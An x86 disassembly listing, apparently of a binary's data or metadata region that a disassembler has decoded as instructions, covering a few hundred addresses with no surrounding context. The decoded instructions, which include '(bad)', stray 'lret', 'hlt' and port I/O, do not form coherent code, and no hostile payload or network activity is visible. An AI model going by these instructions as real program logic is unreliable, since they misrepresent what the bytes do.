  4069b7:	00 86 08 97 25 5a    	add    %al,0x5a259708(%esi)
  4069bd:	02 5c 00 67          	add    0x67(%eax,%eax,1),%bl
  4069c1:	25 00 00 00 00       	and    $0x0,%eax
  4069c6:	86 08                	xchg   %cl,(%eax)
  4069c8:	2f                   	das
  4069c9:	10 5f 02             	adc    %bl,0x2(%edi)
  4069cc:	5c                   	pop    %esp
  4069cd:	00 6f 25             	add    %ch,0x25(%edi)
  4069d0:	00 00                	add    %al,(%eax)
  4069d2:	00 00                	add    %al,(%eax)
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	dc 1d 64 02 5c 00    	fcompl 0x5c0264
  4069dc:	7c 25                	jl     0x406a03
  4069de:	00 00                	add    %al,(%eax)
  4069e0:	00 00                	add    %al,(%eax)
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	13 1e                	adc    (%esi),%ebx
  4069e6:	0e                   	push   %cs
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 66 25             	add    %ah,0x25(%esi)
  4069f4:	b1 02                	mov    $0x2,%cl
  4069f6:	5c                   	pop    %esp
  4069f7:	00 8f 25 00 00 00    	add    %cl,0x25(%edi)
  4069fd:	00 96 00 14 19 b8    	add    %dl,-0x47e6ec00(%esi)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 6b 03             	add    %ch,0x3(%ebx)
  406a10:	be 02 5f 00 78       	mov    $0x78005f02,%esi
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 13 1e 0e    	add    %al,0xe1e1318(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 c9                	add    %cl,%cl
  406a2b:	1b c5                	sbb    %ebp,%eax
  406a2d:	02 61 00             	add    0x0(%ecx),%ah
  406a30:	04 56                	add    $0x56,%al
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 86 07 cb 02 62    	add    %al,0x6202cb07(%esi)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 f9                	add    %bh,%cl
  406a47:	15 d2 02 64 00       	adc    $0x6402d2,%eax
  406a4c:	ab                   	stos   %eax,%es:(%edi)
  406a4d:	25 00 00 00 00       	and    $0x0,%eax
  406a52:	96                   	xchg   %eax,%esi
  406a53:	00 b5 0b da 02 66    	add    %dh,0x6602da0b(%ebp)
  406a59:	00 c6                	add    %al,%dh
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 1b                	add    %bl,(%ebx)
  406a63:	03 e1                	add    %ecx,%esp
  406a65:	02 68 00             	add    0x0(%eax),%ch
  406a68:	e6 25                	out    %al,$0x25
  406a6a:	00 00                	add    %al,(%eax)
  406a6c:	00 00                	add    %al,(%eax)
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 96 06 e8 02 6a    	add    %dl,0x6a02e806(%esi)
  406a75:	00 6c 57 00          	add    %ch,0x0(%edi,%edx,2)
  406a79:	00 00                	add    %al,(%eax)
  406a7b:	00 96 00 63 07 ef    	add    %dl,-0x10f89d00(%esi)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 3f                	add    %bh,(%edi)
  406a8d:	0a f6                	or     %dh,%dh
  406a8f:	02 6e 00             	add    0x0(%esi),%ch
  406a92:	78 20                	js     0x406ab4
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	13 1e                	adc    (%esi),%ebx
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 7b 06             	add    %bh,0x6(%ebx)
  406aaa:	84 01                	test   %al,(%ecx)
  406aac:	70 00                	jo     0x406aae
  406aae:	6c                   	insb   (%dx),%es:(%edi)
  406aaf:	59                   	pop    %ecx
  406ab0:	00 00                	add    %al,(%eax)
  406ab2:	00 00                	add    %al,(%eax)
  406ab4:	96                   	xchg   %eax,%esi
  406ab5:	00 57 0a             	add    %dl,0xa(%edi)
  406ab8:	84 01                	test   %al,(%ecx)
  406aba:	71 00                	jno    0x406abc
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	ff 02                	incl   (%edx)
  406ac2:	00 00                	add    %al,(%eax)
  406ac4:	01 00                	add    %eax,(%eax)
  406ac6:	0b 06                	or     (%esi),%eax
  406ac8:	00 00                	add    %al,(%eax)
  406aca:	01 00                	add    %eax,(%eax)
  406acc:	4a                   	dec    %edx
  406acd:	24 00                	and    $0x0,%al
  406acf:	00 01                	add    %al,(%ecx)
  406ad1:	00 69 0b             	add    %ch,0xb(%ecx)
  406ad4:	00 00                	add    %al,(%eax)
  406ad6:	01 00                	add    %eax,(%eax)
  406ad8:	f0 17                	lock pop %ss
  406ada:	00 00                	add    %al,(%eax)
  406adc:	01 00                	add    %eax,(%eax)
  406ade:	2f                   	das
  406adf:	20 00                	and    %al,(%eax)
  406ae1:	00 01                	add    %al,(%ecx)
  406ae3:	00 2c 07             	add    %ch,(%edi,%eax,1)
  406ae6:	00 00                	add    %al,(%eax)
  406ae8:	01 00                	add    %eax,(%eax)
  406aea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406aeb:	05 00 00 01 00       	add    $0x10000,%eax
  406af0:	0d 09 00 00 01       	or     $0x1000009,%eax
  406af5:	00 62 01             	add    %ah,0x1(%edx)
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	f4                   	hlt
  406afd:	0e                   	push   %cs
  406afe:	00 00                	add    %al,(%eax)
  406b00:	01 00                	add    %eax,(%eax)
  406b02:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406b03:	01 00                	add    %eax,(%eax)
  406b05:	00 02                	add    %al,(%edx)
  406b07:	00 a8 04 00 00 03    	add    %ch,0x3000004(%eax)
  406b0d:	00 09                	add    %cl,(%ecx)
  406b0f:	1b 00                	sbb    (%eax),%eax
  406b11:	00 04 00             	add    %al,(%eax,%eax,1)
  406b14:	b4 07                	mov    $0x7,%ah
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  406b1b:	15 00 00 01 00       	adc    $0x10000,%eax
  406b20:	a0 24 00 00 01       	mov    0x1000024,%al
  406b25:	00 83 03 00 00 01    	add    %al,0x1000003(%ebx)
  406b2b:	00 0e                	add    %cl,(%esi)
  406b2d:	07                   	pop    %es
  406b2e:	00 00                	add    %al,(%eax)
  406b30:	01 00                	add    %eax,(%eax)
  406b32:	3e 05 00 00 01 00    	ds add $0x10000,%eax
  406b38:	39 0d 00 00 01 00    	cmp    %ecx,0x10000
  406b3e:	ea 09 00 00 02 00 a2 	ljmp   $0xa200,$0x2000009
  406b45:	13 00                	adc    (%eax),%eax
  406b47:	00 03                	add    %al,(%ebx)
  406b49:	00 c8                	add    %cl,%al
  406b4b:	02 00                	add    (%eax),%al
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 b5 04 00 00 01    	add    %dh,0x1000004(%ebp)
  406b55:	00 ff                	add    %bh,%bh
  406b57:	16                   	push   %ss
  406b58:	00 00                	add    %al,(%eax)
  406b5a:	02 00                	add    (%eax),%al
  406b5c:	98                   	cwtl
  406b5d:	07                   	pop    %es
  406b5e:	00 00                	add    %al,(%eax)
  406b60:	01 00                	add    %eax,(%eax)
  406b62:	cc                   	int3
  406b63:	15 00 00 01 00       	adc    $0x10000,%eax
  406b68:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406b69:	07                   	pop    %es
  406b6a:	00 00                	add    %al,(%eax)
  406b6c:	02 00                	add    (%eax),%al
  406b6e:	4e                   	dec    %esi
  406b6f:	1b 00                	sbb    (%eax),%eax
  406b71:	00 03                	add    %al,(%ebx)
  406b73:	00 6f 06             	add    %ch,0x6(%edi)
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 00                	add    %eax,(%eax)
  406b7a:	20 04 00             	and    %al,(%eax,%eax,1)
  406b7d:	00 02                	add    %al,(%edx)
  406b7f:	00 57 02             	add    %dl,0x2(%edi)
  406b82:	00 00                	add    %al,(%eax)
  406b84:	01 00                	add    %eax,(%eax)
  406b86:	31 24 00             	xor    %esp,(%eax,%eax,1)
  406b89:	00 02                	add    %al,(%edx)
  406b8b:	00 73 10             	add    %dh,0x10(%ebx)
  406b8e:	00 00                	add    %al,(%eax)
  406b90:	01 00                	add    %eax,(%eax)
  406b92:	78 08                	js     0x406b9c
  406b94:	00 00                	add    %al,(%eax)
  406b96:	01 00                	add    %eax,(%eax)
  406b98:	ac                   	lods   %ds:(%esi),%al
  406b99:	08 00                	or     %al,(%eax)
  406b9b:	00 01                	add    %al,(%ecx)
  406b9d:	00 47 01             	add    %al,0x1(%edi)
  406ba0:	00 00                	add    %al,(%eax)
  406ba2:	01 00                	add    %eax,(%eax)
  406ba4:	4b                   	dec    %ebx
  406ba5:	0b 00                	or     (%eax),%eax
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 19                	add    %bl,(%ecx)
  406bab:	01 00                	add    %eax,(%eax)
  406bad:	00 01                	add    %al,(%ecx)
  406baf:	00 6c 05 00          	add    %ch,0x0(%ebp,%eax,1)
  406bb3:	00 01                	add    %al,(%ecx)
  406bb5:	00 81 23 00 00 01    	add    %al,0x1000023(%ecx)
  406bbb:	00 08                	add    %cl,(%eax)
  406bbd:	18 00                	sbb    %al,(%eax)
  406bbf:	00 01                	add    %al,(%ecx)
  406bc1:	00 fa                	add    %bh,%dl
  406bc3:	1a 00                	sbb    (%eax),%al
  406bc5:	00 01                	add    %al,(%ecx)
  406bc7:	00 19                	add    %bl,(%ecx)
  406bc9:	05 00 00 01 00       	add    $0x10000,%eax
  406bce:	6c                   	insb   (%dx),%es:(%edi)
  406bcf:	08 00                	or     %al,(%eax)
  406bd1:	00 02                	add    %al,(%edx)
  406bd3:	00 ea                	add    %ch,%dl
  406bd5:	15 00 00 01 00       	adc    $0x10000,%eax
  406bda:	e2 18                	loop   0x406bf4
  406bdc:	00 00                	add    %al,(%eax)
  406bde:	01 00                	add    %eax,(%eax)
  406be0:	be 23 00 00 01       	mov    $0x1000023,%esi
  406be5:	00 e7                	add    %ah,%bh
  406be7:	1b 00                	sbb    (%eax),%eax
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 6f 02             	add    %ch,0x2(%edi)
  406bee:	00 00                	add    %al,(%eax)
  406bf0:	01 00                	add    %eax,(%eax)
  406bf2:	ee                   	out    %al,(%dx)
  406bf3:	00 00                	add    %al,(%eax)
  406bf5:	00 01                	add    %al,(%ecx)
  406bf7:	00 2c 04             	add    %ch,(%esp,%eax,1)
  406bfa:	00 00                	add    %al,(%eax)
  406bfc:	01 00                	add    %eax,(%eax)
  406bfe:	ed                   	in     (%dx),%eax
  406bff:	08 00                	or     %al,(%eax)
  406c01:	00 01                	add    %al,(%ecx)
  406c03:	00 88 05 00 00 01    	add    %cl,0x1000005(%eax)
  406c09:	00 65 0a             	add    %ah,0xa(%ebp)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	e5 04                	in     $0x4,%eax
  406c12:	00 00                	add    %al,(%eax)
  406c14:	01 00                	add    %eax,(%eax)
  406c16:	7d 01                	jge    0x406c19
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	69 16 00 00 01 00    	imul   $0x10000,(%esi),%edx
  406c22:	c8 01 00 00          	enter  $0x1,$0x0
  406c26:	02 00                	add    (%eax),%al
  406c28:	e0 01                	loopne 0x406c2b
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	01 00                	add    %eax,(%eax)
  406c2e:	a0 1b 00 00 01       	mov    0x100001b,%al
  406c33:	00 c8                	add    %cl,%al
  406c35:	04 00                	add    $0x0,%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 b1 23 00 00 01    	add    %dh,0x1000023(%ecx)
  406c3f:	00 5c 24 00          	add    %bl,0x0(%esp)
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406c4b:	00 46 04             	add    %al,0x4(%esi)
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	01 00                	add    %eax,(%eax)
  406c52:	74 1b                	je     0x406c6f
  406c54:	00 00                	add    %al,(%eax)
  406c56:	01 00                	add    %eax,(%eax)
  406c58:	39 04 00             	cmp    %eax,(%eax,%eax,1)
  406c5b:	00 01                	add    %al,(%ecx)
  406c5d:	00 c4                	add    %al,%ah
  406c5f:	08 00                	or     %al,(%eax)
  406c61:	00 01                	add    %al,(%ecx)
  406c63:	00 2a                	add    %ch,(%edx)
  406c65:	09 00                	or     %eax,(%eax)
  406c67:	00 01                	add    %al,(%ecx)
  406c69:	00 f6                	add    %dh,%dh
  406c6b:	03 00                	add    (%eax),%eax
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 e1                	add    %ah,%cl
  406c71:	26 00 00             	add    %al,%es:(%eax)
  406c74:	01 00                	add    %eax,(%eax)
  406c76:	ac                   	lods   %ds:(%esi),%al
  406c77:	0d 00 00 02 00       	or     $0x20000,%eax
  406c7c:	d2 20                	shlb   %cl,(%eax)
  406c7e:	00 00                	add    %al,(%eax)
  406c80:	01 00                	add    %eax,(%eax)
  406c82:	f9                   	stc
  406c83:	26 00 00             	add    %al,%es:(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	dd 09                	fisttpll (%ecx)
  406c8a:	00 00                	add    %al,(%eax)
  406c8c:	01 00                	add    %eax,(%eax)
  406c8e:	d5 26                	aad    $0x26
  406c90:	00 00                	add    %al,(%eax)
  406c92:	01 00                	add    %eax,(%eax)
  406c94:	39 08                	cmp    %ecx,(%eax)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	40                   	inc    %eax
  406c9b:	16                   	push   %ss
  406c9c:	00 00                	add    %al,(%eax)
  406c9e:	01 00                	add    %eax,(%eax)
  406ca0:	ba 02 00 00 01       	mov    $0x1000002,%edx
  406ca5:	00 a2 06 00 00 01    	add    %ah,0x1000006(%edx)
  406cab:	00 b0 01 00 00 01    	add    %dh,0x1000001(%eax)
  406cb1:	00 39                	add    %bh,(%ecx)
  406cb3:	1c 00                	sbb    $0x0,%al
  406cb5:	00 01                	add    %al,(%ecx)
  406cb7:	00 4b 25             	add    %cl,0x25(%ebx)
  406cba:	00 00                	add    %al,(%eax)
  406cbc:	01 00                	add    %eax,(%eax)
  406cbe:	56                   	push   %esi
  406cbf:	01 00                	add    %eax,(%eax)
  406cc1:	00 01                	add    %al,(%ecx)
  406cc3:	00 0c 15 00 00 01 00 	add    %cl,0x10000(,%edx,1)
  406cca:	5f                   	pop    %edi
  406ccb:	13 00                	adc    (%eax),%eax
  406ccd:	00 01                	add    %al,(%ecx)
  406ccf:	00 26                	add    %ah,(%esi)
  406cd1:	23 00                	and    (%eax),%eax
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 ff                	add    %bh,%bh
  406cd7:	08 00                	or     %al,(%eax)
  406cd9:	00 01                	add    %al,(%ecx)
  406cdb:	00 e5                	add    %ah,%ch
  406cdd:	24 00                	and    $0x0,%al
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 57 07             	add    %dl,0x7(%edi)
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	82 09 00             	orb    $0x0,(%ecx)
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 76 24             	add    %dh,0x24(%esi)
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	f7 24 00             	mull   (%eax,%eax,1)
  406cf7:	00 02                	add    %al,(%edx)
  406cf9:	00 ba 26 00 00 01    	add    %bh,0x1000026(%edx)
  406cff:	00 aa 02 00 00 01    	add    %ch,0x1000002(%edx)
  406d05:	00 74 23 00          	add    %dh,0x0(%ebx,%eiz,1)
  406d09:	00 02                	add    %al,(%edx)
  406d0b:	00 9f 0d 00 00 01    	add    %bl,0x100000d(%edi)
  406d11:	00 02                	add    %al,(%edx)
  406d13:	1c 00                	sbb    $0x0,%al
  406d15:	00 02                	add    %al,(%edx)
  406d17:	00 af 05 00 00 01    	add    %ch,0x1000005(%edi)
  406d1d:	00 6e 13             	add    %ch,0x13(%esi)
  406d20:	00 00                	add    %al,(%eax)
  406d22:	02 00                	add    (%eax),%al
  406d24:	c6                   	(bad)
  406d25:	26 00 00             	add    %al,%es:(%eax)
  406d28:	01 00                	add    %eax,(%eax)
  406d2a:	7a 1a                	jp     0x406d46
  406d2c:	00 00                	add    %al,(%eax)
  406d2e:	02 00                	add    (%eax),%al
  406d30:	8e 23                	mov    (%ebx),%fs
  406d32:	00 00                	add    %al,(%eax)
  406d34:	01 00                	add    %eax,(%eax)
  406d36:	cb                   	lret
  406d37:	03 00                	add    (%eax),%eax
  406d39:	00 02                	add    %al,(%edx)
  406d3b:	00 3b                	add    %bh,(%ebx)
  406d3d:	1b 00                	sbb    (%eax),%eax
  406d3f:	00 01                	add    %al,(%ecx)
  406d41:	00 ed                	add    %ch,%ch
  406d43:	26 00 00             	add    %al,%es:(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	d3 0b                	rorl   %cl,(%ebx)
  406d4a:	00 00                	add    %al,(%eax)
  406d4c:	01 00                	add    %eax,(%eax)
  406d4e:	36 06                	ss push %es
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	f0 04 00             	lock add $0x0,%al
  406d57:	00 01                	add    %al,(%ecx)
  406d59:	00 9c 02 00 00 01 00 	add    %bl,0x10000(%edx,%eax,1)
  406d60:	47                   	inc    %edi
  406d61:	06                   	push   %es
  406d62:	16                   	push   %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 7a 22 bb    	add    %dh,-0x44dd8600(%ecx)
  406d6f:	01 b1 00 51 23 bf    	add    %esi,-0x40dcaf00(%ecx)
  406d75:	01 b1 00 a1 21 0e    	add    %esi,0xe21a100(%ecx)
  406d7b:	00 b9 00 fb 1d 64    	add    %bh,0x641dfb00(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 13                	add    %dl,(%ebx)
  406d85:	1e                   	push   %ds
  406d86:	01 03                	add    %eax,(%ebx)
  406d88:	d1 00                	roll   $1,(%eax)
  406d8a:	13 1e                	adc    (%esi),%ebx
  406d8c:	0e                   	push   %cs
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 13                	add    %dl,(%ebx)
  406d91:	1e                   	push   %ds
  406d92:	2e 03 e9             	cs add %ecx,%ebp
  406d95:	00 13                	add    %dl,(%ebx)
  406d97:	1e                   	push   %ds
  406d98:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  406d9b:	00 13                	add    %dl,(%ebx)
  406d9d:	1e                   	push   %ds
  406d9e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  406da1:	00 13                	add    %dl,(%ebx)
  406da3:	1e                   	push   %ds
  406da4:	6b 01 01             	imul   $0x1,(%ecx),%eax
  406da7:	01 13                	add    %edx,(%ebx)
  406da9:	1e                   	push   %ds
  406daa:	6b 01 09             	imul   $0x9,(%ecx),%eax
  406dad:	01 13                	add    %edx,(%ebx)
  406daf:	1e                   	push   %ds
  406db0:	6b 01 11             	imul   $0x11,(%ecx),%eax
  406db3:	01 13                	add    %edx,(%ebx)
  406db5:	1e                   	push   %ds
  406db6:	6b 01 19             	imul   $0x19,(%ecx),%eax
  406db9:	01 13                	add    %edx,(%ebx)
  406dbb:	1e                   	push   %ds
  406dbc:	6b 01 21             	imul   $0x21,(%ecx),%eax
  406dbf:	01 13                	add    %edx,(%ebx)
  406dc1:	1e                   	push   %ds
  406dc2:	6b 01 29             	imul   $0x29,(%ecx),%eax
  406dc5:	01 13                	add    %edx,(%ebx)
  406dc7:	1e                   	push   %ds
  406dc8:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406dcb:	01 13                	add    %edx,(%ebx)
  406dcd:	1e                   	push   %ds
  406dce:	4b                   	dec    %ebx
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 13                	add    %edx,(%ebx)
  406dd3:	1e                   	push   %ds
  406dd4:	0e                   	push   %cs
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	13 1e                	adc    (%esi),%ebx
  406dda:	6b 01 49             	imul   $0x49,(%ecx),%eax
  406ddd:	01 48 1b             	add    %ecx,0x1b(%eax)
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	c3                   	ret
  406deb:	21 7f 00             	and    %edi,0x0(%edi)
  406dee:	51                   	push   %ecx
  406def:	01 0a                	add    %ecx,(%edx)
  406df1:	19 84 00 09 00 13 1e 	sbb    %eax,0x1e130009(%eax,%eax,1)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	92                   	xchg   %eax,%edx
  406dfd:	00 cd                	add    %cl,%ch
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	55                   	push   %ebp
  406e03:	14 2a                	adc    $0x2a,%al
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406e09:	14 d3                	adc    $0xd3,%al
  406e0b:	03 11                	add    (%ecx),%edx
  406e0d:	00 13                	add    %dl,(%ebx)
  406e0f:	1e                   	push   %ds
  406e10:	2b 02                	sub    (%edx),%eax
  406e12:	11 00                	adc    %eax,(%eax)
  406e14:	d9 25 d9 03 69 01    	fldenv 0x16903d9
  406e1a:	b1 25                	mov    $0x25,%cl
  406e1c:	df 03                	filds  (%ebx)
  406e1e:	61                   	popa
  406e1f:	01 64 1f e5          	add    %esp,-0x1b(%edi,%ebx,1)
  406e23:	03 81 01 8b 01 c7    	add    -0x38fe74ff(%ecx),%eax
  406e29:	00 79 01             	add    %bh,0x1(%ecx)
  406e2c:	4f                   	dec    %edi
  406e2d:	15 eb 03 19 00       	adc    $0x1903eb,%eax
  406e32:	13 1e                	adc    (%esi),%ebx
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 3d 13 01 03 19    	add    %bh,0x19030113
  406e3d:	00 2a                	add    %ch,(%edx)
  406e3f:	13 01                	adc    (%ecx),%eax
  406e41:	03 c1                	add    %ecx,%eax
  406e43:	01 6e 26             	add    %ebp,0x26(%esi)
  406e46:	16                   	push   %ss
  406e47:	04 c1                	add    $0xc1,%al
  406e49:	01 bd 21 1c 04 d1    	add    %edi,-0x2efbe3df(%ebp)
  406e4f:	01 13                	add    %edx,(%ebx)
  406e51:	1e                   	push   %ds
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 55 23             	add    %edx,0x23(%ebp)
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 05 1f 28 04 19    	add    %eax,0x1904281f
  406e61:	00 51 21             	add    %dl,0x21(%ecx)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 e0                	add    %ah,%al
  406e69:	0b bf 01 19 00 51    	or     0x51001901(%edi),%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 13                	add    %edx,(%ebx)
  406e75:	1e                   	push   %ds
  406e76:	0e                   	push   %cs
  406e77:	00 a1 01 13 1e 36    	add    %ah,0x361e1301(%ecx)
  406e7d:	02 99 01 c3 1f 38    	add    0x381fc301(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 75 14             	add    %esi,0x14(%ebp)
  406e88:	70 01                	jo     0x406e8b
  406e8a:	c1 01 bd             	roll   $0xbd,(%ecx)
  406e8d:	21 3f                	and    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 55 23             	add    %edx,0x23(%ebp)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 89 10 0e 00 f9    	add    %ecx,-0x6fff1f0(%ecx)
  406e9d:	01 13                	add    %edx,(%ebx)
  406e9f:	1e                   	push   %ds
  406ea0:	4f                   	dec    %edi
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 13                	add    (%ebx),%dl
  406ea5:	1e                   	push   %ds
  406ea6:	56                   	push   %esi
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 13                	add    %dl,(%ebx)
  406eab:	1e                   	push   %ds
  406eac:	5c                   	pop    %esp
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 ac 22 66 04 09 00 	add    %ch,0x90466(%edx,%eiz,1)
  406eb6:	84 14 47             	test   %dl,(%edi,%eax,2)
  406eb9:	02 21                	add    (%ecx),%ah
  406ebb:	00 28                	add    %ch,(%eax)
  406ebd:	22 6c 04 29          	and    0x29(%esp,%eax,1),%ch
  406ec1:	02 13                	add    (%ebx),%dl
  406ec3:	1e                   	push   %ds
  406ec4:	56                   	push   %esi
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 13                	add    %dl,(%ebx)
  406ec9:	1e                   	push   %ds
  406eca:	78 04                	js     0x406ed0
  406ecc:	31 02                	xor    %eax,(%edx)
  406ece:	13 1e                	adc    (%esi),%ebx
  406ed0:	56                   	push   %esi
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 8c 0b 82 04 39 02 	add    %cl,0x2390482(%ebx,%ecx,1)
  406eda:	d4 0f                	aam    $0xf
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 d3                	add    %dl,%bl
  406ee1:	1f                   	pop    %ds
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 89 10 0e 00 19    	add    %cl,0x19000e10(%ecx)
  406eeb:	00 89 10 0e 00 29    	add    %cl,0x29000e10(%ecx)
  406ef1:	00 89 10 0e 00 c1    	add    %cl,-0x3efff1f0(%ecx)
  406ef7:	00 84 0b a1 04 49 02 	add    %al,0x24904a1(%ebx,%ecx,1)
  406efe:	44                   	inc    %esp
  406eff:	00 a7 04 c1 00 91    	add    %ah,-0x6eff3efc(%edi)
  406f05:	0b ae 04 51 02 13    	or     0x13025104(%esi),%ebp
  406f0b:	1e                   	push   %ds
  406f0c:	56                   	push   %esi
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 13                	add    %edx,(%ebx)
  406f11:	1e                   	push   %ds
  406f12:	b6 04                	mov    $0x4,%dh
  406f14:	49                   	dec    %ecx
  406f15:	01 fb                	add    %edi,%ebx
  406f17:	22 bd 04 61 02 9a    	and    -0x65fd9efc(%ebp),%bh
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	64 1f                	fs pop %ds
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 d0                	add    %dl,%al
  406f29:	17                   	pop    %ss
  406f2a:	d6                   	salc
  406f2b:	04 c1                	add    $0xc1,%al
  406f2d:	00 ee                	add    %ch,%dh
  406f2f:	10 de                	adc    %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 13                	add    (%ebx),%dl
  406f35:	1e                   	push   %ds
  406f36:	2b 02                	sub    (%edx),%eax
  406f38:	c1 00 11             	roll   $0x11,(%eax)
  406f3b:	1a 15 02 c1 00 5a    	sbb    0x5a00c102,%dl
  406f41:	15 0e 00 61 02       	adc    $0x261000e,%eax
  406f46:	c3                   	ret
  406f47:	21 9a 00 71 02 49    	and    %ebx,0x49027100(%edx)
  406f4d:	21 0a                	and    %ecx,(%edx)
  406f4f:	00 59 01             	add    %bl,0x1(%ecx)
  406f52:	dd 1e                	fstpl  (%esi)
  406f54:	c7 00 a1 02 17 10    	movl   $0x101702a1,(%eax)
  406f5a:	01 05 79 02 13 1e    	add    %eax,0x1e130279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 76 20             	add    0x20(%esi),%dh
  406f66:	07                   	pop    %es
